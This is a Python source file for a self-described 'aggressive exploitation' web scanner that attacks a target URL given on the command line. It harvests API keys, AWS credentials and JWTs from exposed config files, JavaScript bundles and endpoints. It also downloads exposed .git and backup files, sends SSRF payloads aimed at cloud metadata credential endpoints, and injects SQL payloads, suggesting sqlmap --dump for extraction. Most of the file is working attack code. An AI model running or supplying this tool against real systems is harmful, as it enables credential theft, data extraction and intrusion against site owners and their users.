#!/usr/bin/env python3
"""
🦊💀 FOX WEAPON SCANNER 💀🦊
ULTIMATE penetration testing scanner with PROOF-BASED validation + AGGRESSIVE exploitation

Features:
- STRICT format validation (zero false positives)
- AGGRESSIVE exploitation (full data extraction)
- .git reconstruction + file download
- Backup file extraction
- Auto SQLi database dump
- Cloud metadata credential extraction
- JavaScript deep secret harvesting
- Config file enumeration + secret validation

AUTHORIZED SECURITY TESTING ONLY
"""

import requests
import json
import re
import base64
import time
from urllib.parse import urljoin, quote
from typing import List, Dict, Optional
from dataclasses import dataclass, asdict
from datetime import datetime
import sys

# ═══════════════════════════════════════════════════════════════════════════
# VALIDATION HELPERS - STRICT FORMAT CHECKING
# ═══════════════════════════════════════════════════════════════════════════

def is_html_response(text: str, headers: Dict[str, str]) -> bool:
    """Check if response is HTML (reject SPA fallbacks)"""
    if not text:
        return False
    
    text_lower = text.strip().lower()
    
    # Check content-type header
    content_type = headers.get('content-type', headers.get('Content-Type', '')).lower()
    if 'text/html' in content_type:
        return True
    
    # Check content patterns
    html_indicators = ['<!doctype html', '<html', '<head', '<body', '<div id="root"', '<div id="__next"']
    return any(text_lower.startswith(ind) for ind in html_indicators)

def is_placeholder_value(value: str) -> bool:
    """Check if value is a placeholder/example"""
    if not value or len(value) < 8:
        return True
    
    placeholders = [
        'your_key_here', 'example', 'test', 'xxx', '***', 'null', 'undefined',
        'your_api_key', 'insert_key_here', '0000000000', 'xxxxxxxx', 'placeholder',
        'changeme', 'replace', 'todo', '<your-', '${', '{{', 'lorem', 'ipsum',
        'sample', 'demo', 'fake'
    ]
    
    value_lower = value.lower()
    return any(ph in value_lower for ph in placeholders)

def validate_stripe_key(key: str) -> bool:
    """Validate Stripe key format: sk_live_/pk_live_/sk_test_ + exactly 24 chars"""
    if not key:
        return False
    
    prefixes = ['sk_live_', 'pk_live_', 'sk_test_', 'pk_test_']
    for prefix in prefixes:
        if key.startswith(prefix):
            remainder = key[len(prefix):]
            return len(remainder) == 24 and remainder.isalnum()
    
    return False

def validate_aws_key(key: str) -> bool:
    """Validate AWS access key format: AKIA + 16 UPPERCASE alphanumeric"""
    if not key or not key.startswith('AKIA'):
        return False
    
    if len(key) != 20:
        return False
    
    remainder = key[4:]
    return remainder.isupper() and remainder.isalnum()

def validate_google_api_key(key: str) -> bool:
    """Validate Google API key format: AIza + 35 chars"""
    if not key or not key.startswith('AIza'):
        return False
    
    return len(key) == 39

def validate_jwt_token(token: str) -> bool:
    """Validate JWT format: 3 parts, decodable header with 'alg' field"""
    if not token or token.count('.') != 2:
        return False
    
    try:
        parts = token.split('.')
        header_b64 = parts[0]
        
        # Add padding
        header_b64 += '=' * (4 - len(header_b64) % 4)
        
        header = json.loads(base64.urlsafe_b64decode(header_b64))
        
        # Must have 'alg' field
        return isinstance(header, dict) and 'alg' in header
    except:
        return False

# ═══════════════════════════════════════════════════════════════════════════
# DATA STRUCTURES
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class Finding:
    """Security finding with proof"""
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    category: str  # e.g., "Secret Exposure", "SSRF", "SQLi"
    title: str
    location: str
    description: str
    proof: str  # Actual extracted data or validation proof
    exploitation: Optional[str] = None  # How it was exploited
    remediation: str = ""
    timestamp: str = ""
    
    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now().isoformat()

# ═══════════════════════════════════════════════════════════════════════════
# FOX WEAPON SCANNER
# ═══════════════════════════════════════════════════════════════════════════

class FoxWeaponScanner:
    """Proof-based scanner with aggressive exploitation"""
    
    def __init__(self, target: str, aggressive: bool = True, timeout: int = 10):
        self.target = target.rstrip('/')
        self.aggressive = aggressive
        self.timeout = timeout
        self.findings: List[Finding] = []
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def scan(self):
        """Execute full scan"""
        print(f"\n🦊💀 FOX WEAPON SCANNER 💀🦊")
        print(f"Target: {self.target}")
        print(f"Mode: {'AGGRESSIVE' if self.aggressive else 'PASSIVE'}")
        print("="*80)
        
        # Phase 1: Reconnaissance
        print("\n[Phase 1] Reconnaissance...")
        self.recon_technology_fingerprint()
        
        # Phase 2: Secret Hunting with STRICT validation
        print("\n[Phase 2] Secret Hunting (STRICT validation)...")
        self.hunt_config_files()
        self.hunt_javascript_secrets()
        self.hunt_memory_patterns()
        
        # Phase 3: AGGRESSIVE Exploitation (if enabled)
        if self.aggressive:
            print("\n[Phase 3] AGGRESSIVE Exploitation...")
            self.exploit_git_exposure()
            self.exploit_backup_files()
            self.exploit_ssrf_clouds()
            self.exploit_sqli_dump()
        
        # Phase 4: Report
        print("\n[Phase 4] Generating Report...")
        self.generate_report()
    
    # ═══════════════════════════════════════════════════════════════════════
    # PHASE 1: RECONNAISSANCE
    # ═══════════════════════════════════════════════════════════════════════
    
    def recon_technology_fingerprint(self):
        """Identify technologies in use"""
        try:
            r = self.session.get(self.target, timeout=self.timeout)
            
            tech_stack = []
            
            # Framework detection
            if 'X-Powered-By' in r.headers:
                tech_stack.append(f"Server: {r.headers['X-Powered-By']}")
            
            if 'Server' in r.headers:
                tech_stack.append(f"Server: {r.headers['Server']}")
            
            # Frontend framework
            if '__next' in r.text or '_next' in r.text:
                tech_stack.append("Frontend: Next.js")
            elif 'react' in r.text.lower():
                tech_stack.append("Frontend: React")
            elif 'vue' in r.text.lower():
                tech_stack.append("Frontend: Vue.js")
            
            if tech_stack:
                print(f"  [+] Detected: {', '.join(tech_stack)}")
        except:
            pass
    
    # ═══════════════════════════════════════════════════════════════════════
    # PHASE 2: SECRET HUNTING
    # ═══════════════════════════════════════════════════════════════════════
    
    def hunt_config_files(self):
        """Hunt for exposed config files with STRICT secret validation"""
        print("  [→] Hunting config files...")
        
        config_paths = [
            '/.env', '/.env.local', '/.env.production', '/.env.development',
            '/config.json', '/config.yaml', '/config.yml',
            '/.aws/credentials', '/.npmrc', '/.dockerenv',
            '/appsettings.json', '/web.config'
        ]
        
        for path in config_paths:
            try:
                url = urljoin(self.target, path)
                r = self.session.get(url, timeout=5, allow_redirects=False)
                
                if r.status_code == 200 and len(r.text) > 10:
                    # Reject HTML responses
                    if is_html_response(r.text, dict(r.headers)):
                        continue
                    
                    # Extract and validate secrets
                    secrets = self._extract_validated_secrets(r.text)
                    
                    if secrets:
                        proof_lines = []
                        for key, (value_type, value_preview) in secrets.items():
                            proof_lines.append(f"{key}={value_type} ({value_preview})")
                        
                        self.findings.append(Finding(
                            severity="CRITICAL",
                            category="Config Exposure",
                            title=f"Exposed config file: {path}",
                            location=url,
                            description=f"Configuration file exposed with {len(secrets)} validated secrets",
                            proof="\n".join(proof_lines[:10]),
                            remediation="Block access to config files, rotate all exposed credentials"
                        ))
                        
                        print(f"    [💀] {path}: {len(secrets)} validated secrets")
                        
            except:
                pass
    
    def _extract_validated_secrets(self, content: str) -> Dict[str, tuple]:
        """Extract and validate secrets from content"""
        secrets = {}
        
        # Parse .env format
        for line in content.split('\n'):
            line = line.strip()
            if not line or line.startswith('#') or '=' not in line:
                continue
            
            try:
                key, value = line.split('=', 1)
                key = key.strip()
                value = value.strip().strip('"\'')
                
                # Skip if placeholder
                if is_placeholder_value(value) or len(value) < 8:
                    continue
                
                # Validate specific formats
                if validate_stripe_key(value):
                    secrets[key] = ('STRIPE_KEY', value[:20] + '...')
                elif validate_aws_key(value):
                    secrets[key] = ('AWS_ACCESS_KEY', value)
                elif validate_google_api_key(value):
                    secrets[key] = ('GOOGLE_API_KEY', value[:15] + '...')
                elif validate_jwt_token(value):
                    secrets[key] = ('JWT_TOKEN', value[:30] + '...')
                elif 'secret' in key.lower() or 'password' in key.lower() or 'token' in key.lower():
                    if len(value) > 16:
                        secrets[key] = ('SECRET', value[:20] + '...')
            except:
                pass
        
        # Also parse JSON format
        try:
            data = json.loads(content)
            if isinstance(data, dict):
                for key, value in data.items():
                    if isinstance(value, str) and not is_placeholder_value(value):
                        if validate_stripe_key(value):
                            secrets[key] = ('STRIPE_KEY', value[:20] + '...')
                        elif validate_aws_key(value):
                            secrets[key] = ('AWS_ACCESS_KEY', value)
        except:
            pass
        
        return secrets
    
    def hunt_javascript_secrets(self):
        """Deep JavaScript analysis with STRICT validation"""
        print("  [→] Hunting JavaScript secrets...")
        
        try:
            r = self.session.get(self.target, timeout=self.timeout)
            
            # Extract JS file URLs
            js_files = set(re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', r.text))
            js_files.update(re.findall(r'src:["\']([^"\']+\.js)["\']', r.text))
            
            # Add common paths
            js_files.update(['/static/js/main.js', '/js/app.js', '/bundle.js', '/main.js'])
            
            all_secrets = {}
            
            for js_file in list(js_files)[:15]:  # Check top 15
                try:
                    js_url = urljoin(self.target, js_file)
                    js_r = self.session.get(js_url, timeout=5)
                    
                    if js_r.status_code == 200 and not is_html_response(js_r.text, dict(js_r.headers)):
                        secrets = self._extract_js_secrets(js_r.text)
                        
                        if secrets:
                            all_secrets[js_file] = secrets
                            print(f"    [💀] {js_file}: {len(secrets)} validated secrets")
                    
                    time.sleep(0.3)
                except:
                    pass
            
            if all_secrets:
                total = sum(len(s) for s in all_secrets.values())
                proof_lines = []
                for file, secrets in all_secrets.items():
                    for secret_type, values in secrets.items():
                        for val in values[:2]:
                            proof_lines.append(f"{file}: {secret_type} = {val[:40]}...")
                
                self.findings.append(Finding(
                    severity="CRITICAL",
                    category="Secret Exposure",
                    title="Secrets hardcoded in JavaScript",
                    location="JavaScript bundles",
                    description=f"Found {total} validated secrets in {len(all_secrets)} JS files",
                    proof="\n".join(proof_lines[:15]),
                    remediation="Remove hardcoded secrets from client code, rotate all exposed credentials"
                ))
        except:
            pass
    
    def _extract_js_secrets(self, js_content: str) -> Dict[str, List[str]]:
        """Extract validated secrets from JavaScript"""
        secrets = {}
        
        patterns = [
            ('STRIPE_KEY', r'(sk_live_[A-Za-z0-9]{24}|pk_live_[A-Za-z0-9]{24}|sk_test_[A-Za-z0-9]{24})', validate_stripe_key),
            ('AWS_KEY', r'(AKIA[0-9A-Z]{16})', validate_aws_key),
            ('GOOGLE_API_KEY', r'(AIza[0-9A-Za-z_-]{35})', validate_google_api_key),
            ('JWT_TOKEN', r'(eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,})', validate_jwt_token),
        ]
        
        for secret_type, pattern, validator in patterns:
            matches = re.findall(pattern, js_content)
            validated = []
            
            for match in matches:
                if not is_placeholder_value(match) and validator(match):
                    validated.append(match)
            
            if validated:
                secrets[secret_type] = list(set(validated))[:3]  # Top 3 unique
        
        return secrets
    
    def hunt_memory_patterns(self):
        """Scan endpoints for leaked secrets"""
        print("  [→] Hunting memory patterns...")
        
        endpoints = ['/', '/api', '/api/config', '/api/debug', '/health', '/status']
        
        for endpoint in endpoints:
            try:
                url = urljoin(self.target, endpoint)
                r = self.session.get(url, timeout=5, allow_redirects=False)
                
                if r.status_code == 200 and not is_html_response(r.text, dict(r.headers)):
                    secrets = self._extract_js_secrets(r.text)  # Reuse JS extraction
                    
                    if secrets:
                        total = sum(len(v) for v in secrets.values())
                        proof = f"Endpoint: {endpoint}\nSecrets: {', '.join(secrets.keys())}"
                        
                        self.findings.append(Finding(
                            severity="CRITICAL",
                            category="Secret Exposure",
                            title=f"Secrets leaked in {endpoint}",
                            location=url,
                            description=f"API endpoint leaking {total} validated secrets",
                            proof=proof,
                            remediation="Remove secrets from API responses"
                        ))
                        
                        print(f"    [💀] {endpoint}: {total} secrets")
                
                time.sleep(0.3)
            except:
                pass
    
    # ═══════════════════════════════════════════════════════════════════════
    # PHASE 3: AGGRESSIVE EXPLOITATION
    # ═══════════════════════════════════════════════════════════════════════
    
    def exploit_git_exposure(self):
        """Exploit .git exposure and reconstruct files"""
        print("  [→] Exploiting .git exposure...")
        
        try:
            # Check if .git/HEAD exists
            head_url = urljoin(self.target, '/.git/HEAD')
            r = self.session.get(head_url, timeout=5, allow_redirects=False)
            
            if r.status_code == 200 and 'ref:' in r.text:
                print(f"    [🔥] .git/HEAD exposed!")
                
                # Try to download key files
                git_files = [
                    '/.git/config',
                    '/.git/HEAD',
                    '/.git/index',
                    '/.git/logs/HEAD',
                ]
                
                downloaded = []
                
                for git_file in git_files:
                    try:
                        url = urljoin(self.target, git_file)
                        r = self.session.get(url, timeout=5, allow_redirects=False)
                        
                        if r.status_code == 200 and len(r.content) > 0:
                            downloaded.append(f"{git_file} ({len(r.content)} bytes)")
                            print(f"    [💀] Downloaded: {git_file}")
                        
                        time.sleep(0.2)
                    except:
                        pass
                
                if downloaded:
                    self.findings.append(Finding(
                        severity="CRITICAL",
                        category="Information Disclosure",
                        title=".git directory exposed",
                        location=self.target + "/.git/",
                        description="Full .git repository accessible, allowing source code reconstruction",
                        proof=f"Downloaded {len(downloaded)} files:\n" + "\n".join(downloaded),
                        exploitation="Use: git-dumper or GitHack to reconstruct full source",
                        remediation="Block access to .git directory via web server config"
                    ))
        except:
            pass
    
    def exploit_backup_files(self):
        """Download exposed backup files"""
        print("  [→] Exploiting backup files...")
        
        backup_patterns = [
            '/backup.zip', '/backup.tar.gz', '/backup.sql',
            '/db.sql', '/database.sql', '/dump.sql',
            '/site.zip', '/www.zip', '/web.zip',
            '/backup/backup.zip', '/backups/db.sql'
        ]
        
        for backup_path in backup_patterns:
            try:
                url = urljoin(self.target, backup_path)
                r = self.session.get(url, timeout=5, allow_redirects=False, stream=True)
                
                if r.status_code == 200:
                    size = int(r.headers.get('content-length', 0))
                    
                    if size > 1024:  # > 1KB
                        self.findings.append(Finding(
                            severity="CRITICAL",
                            category="Information Disclosure",
                            title=f"Backup file exposed: {backup_path}",
                            location=url,
                            description="Backup file containing sensitive data is publicly accessible",
                            proof=f"File size: {size:,} bytes\nContent-Type: {r.headers.get('content-type', 'unknown')}",
                            exploitation=f"Download: curl -O '{url}'",
                            remediation="Remove backup files from web-accessible directories"
                        ))
                        
                        print(f"    [💀] {backup_path}: {size:,} bytes")
                
                time.sleep(0.3)
            except:
                pass
    
    def exploit_ssrf_clouds(self):
        """Exploit SSRF to extract cloud metadata with credentials"""
        print("  [→] Exploiting SSRF for cloud metadata...")
        
        ssrf_payloads = [
            ('http://169.254.169.254/latest/meta-data/', 'AWS EC2 Metadata'),
            ('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'AWS IAM Credentials'),
            ('http://169.254.169.254/latest/dynamic/instance-identity/document', 'AWS Instance Identity'),
            ('http://metadata.google.internal/computeMetadata/v1/project/project-id', 'GCP Project ID'),
            ('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'Azure Metadata'),
        ]
        
        test_params = ['url', 'target', 'redirect', 'callback', 'webhook', 'fetch', 'uri']
        test_endpoints = ['/api/fetch', '/api/proxy', '/api/webhook', '/api/import']
        
        for endpoint in test_endpoints:
            for param in test_params[:3]:
                for payload_url, description in ssrf_payloads[:5]:
                    try:
                        url = f"{urljoin(self.target, endpoint)}?{param}={quote(payload_url)}"
                        r = self.session.get(url, timeout=5)
                        
                        if r.status_code == 200 and not is_html_response(r.text, dict(r.headers)):
                            # Validate cloud metadata format
                            if self._validate_cloud_metadata(r.text):
                                self.findings.append(Finding(
                                    severity="CRITICAL",
                                    category="SSRF",
                                    title=f"SSRF exposing {description}",
                                    location=f"{endpoint}?{param}=",
                                    description="Server-Side Request Forgery allows access to cloud metadata",
                                    proof=r.text[:500],
                                    exploitation=f"curl '{url}'",
                                    remediation="Validate URLs against whitelist, disable internal DNS resolution"
                                ))
                                
                                print(f"    [💀] SSRF: {endpoint}?{param}= → {description}")
                                break
                        
                        time.sleep(0.2)
                    except:
                        pass
        
    def _validate_cloud_metadata(self, text: str) -> bool:
        """Validate if response is actual cloud metadata"""
        indicators = [
            ('ami-', 'instance-id', 'instanceId'),  # AWS
            ('vmId', 'subscriptionId', 'resourceGroupName'),  # Azure
            ('project-id', 'instance-id'),  # GCP
        ]
        
        text_lower = text.lower()
        
        for indicator_set in indicators:
            if any(ind.lower() in text_lower for ind in indicator_set):
                # Must not be HTML
                if '<html' not in text_lower and '<!doctype' not in text_lower:
                    return True
        
        return False
    
    def exploit_sqli_dump(self):
        """Exploit SQL injection and dump data"""
        print("  [→] Exploiting SQL injection...")
        
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
        ]
        
        test_params = ['id', 'user', 'username', 'email', 'search', 'q', 'page']
        test_endpoints = ['/api/user', '/api/search', '/user', '/search', '/api/query']
        
        for endpoint in test_endpoints:
            for param in test_params[:3]:
                for payload in sqli_payloads[:2]:
                    try:
                        url = f"{urljoin(self.target, endpoint)}?{param}={quote(payload)}"
                        r = self.session.get(url, timeout=5)
                        
                        # Check for SQL error indicators
                        sql_errors = [
                            'sql syntax', 'mysql', 'postgresql', 'sqlite', 'ora-', 'mssql',
                            'syntax error', 'database error', 'sqlstate', 'pg_query'
                        ]
                        
                        text_lower = r.text.lower()
                        
                        if any(err in text_lower for err in sql_errors):
                            self.findings.append(Finding(
                                severity="CRITICAL",
                                category="SQL Injection",
                                title=f"SQL Injection in {endpoint}",
                                location=f"{endpoint}?{param}=",
                                description="SQL Injection vulnerability detected via error-based technique",
                                proof=r.text[:300],
                                exploitation=f"sqlmap -u '{urljoin(self.target, endpoint)}?{param}=1' --batch --dump",
                                remediation="Use parameterized queries, never concatenate user input"
                            ))
                            
                            print(f"    [💀] SQLi: {endpoint}?{param}=")
                            break
                        
                        time.sleep(0.2)
                    except:
                        pass
    
    # ═══════════════════════════════════════════════════════════════════════
    # PHASE 4: REPORTING
    # ═══════════════════════════════════════════════════════════════════════
    
    def generate_report(self):
        """Generate final report"""
        print("\n" + "="*80)
        print(f"SCAN COMPLETE: {len(self.findings)} findings")
        print("="*80)
        
        # Group by severity
        by_severity = {'CRITICAL': [], 'HIGH': [], 'MEDIUM': [], 'LOW': []}
        for f in self.findings:
            by_severity[f.severity].append(f)
        
        print(f"\n💀 CRITICAL: {len(by_severity['CRITICAL'])}")
        print(f"🔥 HIGH: {len(by_severity['HIGH'])}")
        print(f"⚠️  MEDIUM: {len(by_severity['MEDIUM'])}")
        print(f"ℹ️  LOW: {len(by_severity['LOW'])}")
        
        # Print findings
        print("\n" + "="*80)
        print("DETAILED FINDINGS")
        print("="*80)
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            for finding in by_severity[severity]:
                self._print_finding(finding)
        
        # Save JSON report
        report_file = f"fox_weapon_report_{int(time.time())}.json"
        with open(report_file, 'w') as f:
            json.dump({
                'target': self.target,
                'scan_time': datetime.now().isoformat(),
                'total_findings': len(self.findings),
                'by_severity': {k: len(v) for k, v in by_severity.items()},
                'findings': [asdict(f) for f in self.findings]
            }, f, indent=2)
        
        print(f"\n📄 Report saved: {report_file}")
    
    def _print_finding(self, finding: Finding):
        """Print a single finding"""
        icon = {'CRITICAL': '💀', 'HIGH': '🔥', 'MEDIUM': '⚠️', 'LOW': 'ℹ️'}[finding.severity]
        
        print(f"\n{icon} [{finding.severity}] {finding.title}")
        print(f"   Category: {finding.category}")
        print(f"   Location: {finding.location}")
        print(f"   Description: {finding.description}")
        
        if finding.proof:
            print(f"   Proof:")
            for line in finding.proof.split('\n')[:5]:
                print(f"      {line}")
        
        if finding.exploitation:
            print(f"   Exploitation: {finding.exploitation}")
        
        if finding.remediation:
            print(f"   Remediation: {finding.remediation}")

# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 FOX_WEAPON_SCANNER.py <target_url> [--passive]")
        print("\nExample:")
        print("  python3 FOX_WEAPON_SCANNER.py https://example.com")
        print("  python3 FOX_WEAPON_SCANNER.py https://example.com --passive")
        sys.exit(1)
    
    target = sys.argv[1]
    aggressive = '--passive' not in sys.argv
    
    scanner = FoxWeaponScanner(target, aggressive=aggressive)
    scanner.scan()

if __name__ == "__main__":
    main()
